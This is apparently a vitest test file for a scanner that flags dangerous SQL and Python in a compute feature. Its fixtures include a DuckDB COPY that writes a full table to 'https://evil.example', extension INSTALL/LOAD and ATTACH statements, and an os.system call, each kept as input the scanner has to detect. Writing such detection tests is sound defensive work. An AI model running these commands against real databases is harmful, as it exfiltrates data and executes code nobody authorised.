/**
 * Cross-language red-flag scan (#1413).
 *
 * `scanComputeSafety` dispatches to the per-language scanners; the Python side
 * is covered exhaustively by python-safety.test.ts, so here we pin the SQL
 * ruleset and the dispatch (aliases, SPARQL no-op, Python delegation).
 */
import { describe, it, expect } from 'vitest';
import { scanSqlSafety, scanComputeSafety } from '../../../src/shared/compute/safety';

describe('scanSqlSafety (#1413)', () => {
  it('flags COPY … TO a file/URL (the DuckDB write/exfil primitive)', () => {
    const flags = scanSqlSafety("COPY (SELECT * FROM t) TO 'https://evil.example/x.csv'");
    expect(flags.map((f) => f.id)).toContain('sql-copy-to');
  });

  it('does NOT flag a plain COPY … FROM (read)', () => {
    expect(scanSqlSafety("COPY t FROM 'data.csv'")).toEqual([]);
  });

  it('flags extension INSTALL / LOAD and ATTACH', () => {
    expect(scanSqlSafety('INSTALL httpfs;').map((f) => f.id)).toContain('sql-install-extension');
    expect(scanSqlSafety('LOAD httpfs;').map((f) => f.id)).toContain('sql-load-extension');
    expect(scanSqlSafety("ATTACH 'other.db';").map((f) => f.id)).toContain('sql-attach');
  });

  it('ignores a pattern that only appears in a -- comment', () => {
    expect(scanSqlSafety("SELECT 1 -- COPY x TO 'y'")).toEqual([]);
  });

  it('a benign SELECT flags nothing', () => {
    expect(scanSqlSafety('SELECT count(*) FROM notes')).toEqual([]);
  });
});

describe('scanComputeSafety dispatch (#1413)', () => {
  it('delegates Python (and its aliases) to the Python scan', () => {
    for (const lang of ['python', 'Python', 'py', 'python3']) {
      const flags = scanComputeSafety(lang, 'import os\nos.system("id")');
      expect(flags.map((f) => f.id), lang).toContain('os-system');
    }
  });

  it('delegates SQL to the SQL scan', () => {
    expect(scanComputeSafety('sql', "COPY t TO 'x.csv'").map((f) => f.id)).toContain('sql-copy-to');
  });

  it('returns [] for SPARQL and other non-executable languages', () => {
    expect(scanComputeSafety('sparql', 'SELECT * WHERE { ?s ?p ?o }')).toEqual([]);
    expect(scanComputeSafety('mermaid', 'graph TD; A-->B')).toEqual([]);
  });
});
